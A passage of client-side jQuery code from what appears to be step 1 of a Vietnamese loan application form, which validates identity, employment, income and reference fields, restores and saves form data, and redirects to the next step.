            // Validate Ngày cấp
            const issueDate = $('#issueDate').val();
            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(issueDate)) {
                $('#issueDate').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#issueDate')[0];
            } else {
                $('#issueDate').removeClass('is-invalid');
            }

            // Validate Tình trạng hôn nhân
            if (!$('#maritalStatus').val()) {
                $('#maritalStatus').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#maritalStatus')[0];
            } else {
                $('#maritalStatus').removeClass('is-invalid');
            }

            // Validate Chủ hộ khẩu (nếu không phải là chủ hộ)
            const isHouseholdHead = $('input[name="isHouseholdHead"]:checked').val();
            if (isHouseholdHead === 'no') {
                if (!$('#householdHeadName').val().trim()) {
                    $('#householdHeadName').addClass('is-invalid');
                    isValid = false;
                    if (!firstErrorElement) firstErrorElement = $('#householdHeadName')[0];
                } else {
                    $('#householdHeadName').removeClass('is-invalid');
                }
                if (!$('#householdHeadCCCD').val().trim() || !/^\d{12}$/.test($('#householdHeadCCCD').val().trim())) {
                    $('#householdHeadCCCD').addClass('is-invalid');
                    isValid = false;
                    if (!firstErrorElement) firstErrorElement = $('#householdHeadCCCD')[0];
                } else {
                    $('#householdHeadCCCD').removeClass('is-invalid');
                }
                if (!$('#householdHeadPhone').val().trim() || !/^0[1-9][0-9]{8}$/.test($('#householdHeadPhone').val().trim())) {
                    $('#householdHeadPhone').addClass('is-invalid');
                    isValid = false;
                    if (!firstErrorElement) firstErrorElement = $('#householdHeadPhone')[0];
                } else {
                    $('#householdHeadPhone').removeClass('is-invalid');
                }
                if (!$('#householdHeadRelationship').val()) {
                    $('#householdHeadRelationship').addClass('is-invalid');
                    isValid = false;
                    if (!firstErrorElement) firstErrorElement = $('#householdHeadRelationship')[0];
                } else {
                    $('#householdHeadRelationship').removeClass('is-invalid');
                }
            }

            // Validate Học vấn và việc làm
            if (!$('#educationLevel').val()) {
                $('#educationLevel').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#educationLevel')[0];
            } else {
                $('#educationLevel').removeClass('is-invalid');
            }
            if (!$('#companyName').val().trim()) {
                $('#companyName').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#companyName')[0];
            } else {
                $('#companyName').removeClass('is-invalid');
            }
            if (!$('#position').val().trim()) {
                $('#position').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#position')[0];
            } else {
                $('#position').removeClass('is-invalid');
            }
            if (!$('#companyAddress').val().trim()) {
                $('#companyAddress').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#companyAddress')[0];
            } else {
                $('#companyAddress').removeClass('is-invalid');
            }
            if (!$('#workDuration').val().trim()) {
                $('#workDuration').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#workDuration')[0];
            } else {
                $('#workDuration').removeClass('is-invalid');
            }
            const payday = parseInt($('#payday').val());
            if (isNaN(payday) || payday < 1 || payday > 31) {
                $('#payday').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#payday')[0];
            } else {
                $('#payday').removeClass('is-invalid');
            }

            // Validate Năng lực tài chính
            const mainIncome = parseFloat($('#mainIncome').val().replace(/,/g, ''));
            if (isNaN(mainIncome) || mainIncome < 0) {
                $('#mainIncome').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#mainIncome')[0];
            } else {
                $('#mainIncome').removeClass('is-invalid');
            }
            const personalExpenses = parseFloat($('#personalExpenses').val().replace(/,/g, ''));
            if (isNaN(personalExpenses) || personalExpenses < 0) {
                $('#personalExpenses').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#personalExpenses')[0];
            } else {
                $('#personalExpenses').removeClass('is-invalid');
            }

            // Validate Người tham chiếu
            if (!$('#ref1Name').val().trim()) {
                $('#ref1Name').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref1Name')[0];
            } else {
                $('#ref1Name').removeClass('is-invalid');
            }
            if (!$('#ref1Relationship').val()) {
                $('#ref1Relationship').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref1Relationship')[0];
            } else {
                $('#ref1Relationship').removeClass('is-invalid');
            }
            const ref1Phone = $('#ref1Phone').val().trim();
            if (!/^0[1-9][0-9]{8}$/.test(ref1Phone)) {
                $('#ref1Phone').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref1Phone')[0];
            } else {
                $('#ref1Phone').removeClass('is-invalid');
            }
            if (!$('#ref2Name').val().trim()) {
                $('#ref2Name').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref2Name')[0];
            } else {
                $('#ref2Name').removeClass('is-invalid');
            }
            if (!$('#ref2Relationship').val()) {
                $('#ref2Relationship').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref2Relationship')[0];
            } else {
                $('#ref2Relationship').removeClass('is-invalid');
            }
            const ref2Phone = $('#ref2Phone').val().trim();
            if (!/^0[1-9][0-9]{8}$/.test(ref2Phone)) {
                $('#ref2Phone').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#ref2Phone')[0];
            } else {
                $('#ref2Phone').removeClass('is-invalid');
            }

            // Validate Đồng ý cung cấp thông tin
            if (!$('#agreeInfoSharing').is(':checked')) {
                $('#agreeInfoSharing').addClass('is-invalid');
                isValid = false;
                if (!firstErrorElement) firstErrorElement = $('#agreeInfoSharing')[0];
            } else {
                $('#agreeInfoSharing').removeClass('is-invalid');
            }

            // Handle Error Alert
            if(!isValid) {
                $('#errorSummaryAlert').slideDown();
                if (firstErrorElement) {
                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    firstErrorElement.focus();
                }
            } else {
                $('#errorSummaryAlert').slideUp();
            }

            return isValid;
        }

        // --- 3. MAIN FUNCTIONS ---
        $(document).ready(function() {
            // Apply Masks
            $('#dob').mask('00/00/0000');
            $('#issueDate').mask('00/00/0000');
            $('#cccd').mask('000000000000');
            $('#phone').mask('0000000000');
            $('#homePhone, #landlinePhone, #workPhone, #householdHeadPhone, #ref1Phone, #ref2Phone, #spousePhone').mask('0000000000');
            $('#householdHeadCCCD, #spouseCCCD').mask('000000000000');
            $('#mainIncome, #additionalIncome, #personalExpenses').mask('000,000,000,000', {reverse: true});

            // Toggle hiển thị thông tin chủ hộ khẩu
            $('input[name="isHouseholdHead"]').on('change', function() {
                if ($(this).val() === 'no') {
                    $('#householdHeadInfo').slideDown();
                    $('#householdHeadName, #householdHeadCCCD, #householdHeadPhone, #householdHeadRelationship').prop('required', true);
                } else {
                    $('#householdHeadInfo').slideUp();
                    $('#householdHeadName, #householdHeadCCCD, #householdHeadPhone, #householdHeadRelationship').prop('required', false).val('').removeClass('is-invalid');
                }
            });

            // Load Data cũ nếu có
            const savedData = loadUserData();
            if (savedData) {
                $('#fullName').val(savedData.fullName || '');
                $('#dob').val(savedData.dob || '');
                $('#gender').val(savedData.gender || '');
                $('#cccd').val(savedData.cccd || '');
                $('#issueDate').val(savedData.issueDate || '');
                $('#maritalStatus').val(savedData.maritalStatus || '');
                $('#contactAddress').val(savedData.contactAddress || '');
                $('#issuePlace').val(savedData.issuePlace || '');
                $('#phone').val(savedData.phone || '');
                $('#homePhone').val(savedData.homePhone || '');
                $('#landlinePhone').val(savedData.landlinePhone || '');
                $('#workPhone').val(savedData.workPhone || '');
                $('#email').val(savedData.email || '');
                
                // Chủ hộ khẩu
                if (savedData.isHouseholdHead === 'no') {
                    $('input[name="isHouseholdHead"][value="no"]').prop('checked', true).trigger('change');
                    $('#householdHeadName').val(savedData.householdHeadName || '');
                    $('#householdHeadCCCD').val(savedData.householdHeadCCCD || '');
                    $('#householdHeadPhone').val(savedData.householdHeadPhone || '');
                    $('#householdHeadRelationship').val(savedData.householdHeadRelationship || '');
                }
                
                // Học vấn và việc làm
                $('#educationLevel').val(savedData.educationLevel || '');
                $('#companyName').val(savedData.companyName || '');
                $('#companyTaxId').val(savedData.companyTaxId || '');
                $('#position').val(savedData.position || '');
                $('#companyAddress').val(savedData.companyAddress || '');
                $('#workDuration').val(savedData.workDuration || '');
                $('#payday').val(savedData.payday || '');
                
                // Năng lực tài chính
                if (savedData.mainIncome) $('#mainIncome').val(parseInt(savedData.mainIncome).toLocaleString('vi-VN'));
                if (savedData.additionalIncome) $('#additionalIncome').val(parseInt(savedData.additionalIncome).toLocaleString('vi-VN'));
                if (savedData.personalExpenses) $('#personalExpenses').val(parseInt(savedData.personalExpenses).toLocaleString('vi-VN'));
                
                // Người tham chiếu
                $('#ref1Name').val(savedData.ref1Name || '');
                $('#ref1Relationship').val(savedData.ref1Relationship || '');
                $('#ref1Phone').val(savedData.ref1Phone || '');
                $('#ref2Name').val(savedData.ref2Name || '');
                $('#ref2Relationship').val(savedData.ref2Relationship || '');
                $('#ref2Phone').val(savedData.ref2Phone || '');
                
                // Gia đình
                $('#spouseName').val(savedData.spouseName || '');
                $('#spouseCCCD').val(savedData.spouseCCCD || '');
                $('#spousePhone').val(savedData.spousePhone || '');
                
                // Đồng ý
                if (savedData.agreeInfoSharing) $('#agreeInfoSharing').prop('checked', true);
                if (savedData.agreePromotion) $('#agreePromotion').prop('checked', true);
            }

            // Auto uppercase Name
            $('#fullName, #householdHeadName, #ref1Name, #ref2Name, #spouseName').on('input', function() {
                this.value = this.value.toUpperCase();
            });

            // Live Validation remove error on input
            $('input, select, checkbox').on('input change', function() {
                $(this).removeClass('is-invalid');
                $('#errorSummaryAlert').slideUp();
            });
        });

        // Hàm chuyển bước (Được gọi từ nút Tiếp tục) - From step1cu.html logic
        function goToStep2() {
            if (validateStep1()) {
                // Thu thập dữ liệu - Bao gồm tất cả các trường mới
                const isHouseholdHead = $('input[name="isHouseholdHead"]:checked').val();
                const formData = {
                    fullName: $('#fullName').val().trim(),
                    dob: $('#dob').val(),
                    gender: $('#gender').val(),
                    cccd: $('#cccd').val().trim(),
                    issueDate: $('#issueDate').val(),
                    issuePlace: $('#issuePlace').val(),
                    maritalStatus: $('#maritalStatus').val(),
                    contactAddress: $('#contactAddress').val().trim(),
                    phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^(\+?84)/, '0'),
                    homePhone: $('#homePhone').val().trim().replace(/\s/g, ''),
                    landlinePhone: $('#landlinePhone').val().trim().replace(/\s/g, ''),
                    workPhone: $('#workPhone').val().trim().replace(/\s/g, ''),
                    email: $('#email').val().trim(),
                    isHouseholdHead: isHouseholdHead,
                    householdHeadName: isHouseholdHead === 'no' ? $('#householdHeadName').val().trim() : '',
                    householdHeadCCCD: isHouseholdHead === 'no' ? $('#householdHeadCCCD').val().trim() : '',
                    householdHeadPhone: isHouseholdHead === 'no' ? $('#householdHeadPhone').val().trim().replace(/\s/g, '') : '',
                    householdHeadRelationship: isHouseholdHead === 'no' ? $('#householdHeadRelationship').val() : '',
                    educationLevel: $('#educationLevel').val(),
                    companyName: $('#companyName').val().trim(),
                    companyTaxId: $('#companyTaxId').val().trim(),
                    position: $('#position').val().trim(),
                    companyAddress: $('#companyAddress').val().trim(),
                    workDuration: $('#workDuration').val().trim(),
                    payday: $('#payday').val(),
                    mainIncome: $('#mainIncome').val().replace(/,/g, ''),
                    additionalIncome: $('#additionalIncome').val().replace(/,/g, '') || '0',
                    personalExpenses: $('#personalExpenses').val().replace(/,/g, ''),
                    ref1Name: $('#ref1Name').val().trim(),
                    ref1Relationship: $('#ref1Relationship').val(),
                    ref1Phone: $('#ref1Phone').val().trim().replace(/\s/g, ''),
                    ref2Name: $('#ref2Name').val().trim(),
                    ref2Relationship: $('#ref2Relationship').val(),
                    ref2Phone: $('#ref2Phone').val().trim().replace(/\s/g, ''),
                    spouseName: $('#spouseName').val().trim() || '',
                    spouseCCCD: $('#spouseCCCD').val().trim() || '',
                    spousePhone: $('#spousePhone').val().trim().replace(/\s/g, '') || '',
                    agreeInfoSharing: $('#agreeInfoSharing').is(':checked'),
                    agreePromotion: $('#agreePromotion').is(':checked')
                };

                // Lưu
                saveUserData(formData);

                // Hiệu ứng Loading
                $('#loadingModal').css('display', 'flex').hide().fadeIn();
                
                // Chuyển trang sau 1.5s
                setTimeout(() => {
                    window.location.href = 'step2.html';
                }, 1500);
            }
        }
    </script>
</body>
</html>
